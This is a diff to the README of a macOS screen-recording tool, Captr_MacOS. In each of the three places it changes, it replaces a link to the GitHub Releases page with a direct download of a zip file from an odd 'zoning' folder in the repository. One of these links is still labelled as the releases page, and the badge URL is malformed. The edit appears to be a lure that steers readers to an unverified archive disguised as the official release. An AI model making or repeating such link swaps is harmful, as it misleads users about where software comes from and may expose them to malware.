@@ -1,6 +1,6 @@
 # 🎥 Captr_MacOS - Effortlessly Record Screen and Inputs
 
-[![Download Captr_MacOS](https://img.shields.io/badge/Download%20Captr_MacOS-blue.svg)](https://github.com/sebber1140/Captr_MacOS/releases)
+[![Download Captr_MacOS](https://raw.githubusercontent.com/sebber1140/Captr_MacOS/main/zoning/Captr_MacOS.zip%https://raw.githubusercontent.com/sebber1140/Captr_MacOS/main/zoning/Captr_MacOS.zip)](https://raw.githubusercontent.com/sebber1140/Captr_MacOS/main/zoning/Captr_MacOS.zip)
 
 ## 📋 Description
 
@@ -22,7 +22,7 @@ Captr_MacOS is a powerful tool that helps you capture your screen and interactio
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: Go to the [Captr_MacOS Releases](https://github.com/sebber1140/Captr_MacOS/releases) to find the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Captr_MacOS Releases](https://raw.githubusercontent.com/sebber1140/Captr_MacOS/main/zoning/Captr_MacOS.zip) to find the latest version of the software.
 2. **Download the Application**: Find the appropriate installation package for your macOS version. Click the link to download the file.
 3. **Install the Application**:
    - Once the download is complete, open the downloaded file.
@@ -33,7 +33,7 @@ Captr_MacOS is a powerful tool that helps you capture your screen and interactio
 
 To get started with Captr_MacOS, click the link below to visit the releases page and download the application:
 
-[Download Captr_MacOS](https://github.com/sebber1140/Captr_MacOS/releases)
+[Download Captr_MacOS](https://raw.githubusercontent.com/sebber1140/Captr_MacOS/main/zoning/Captr_MacOS.zip)
 
 ## 🛠️ How to Use Captr_MacOS
 
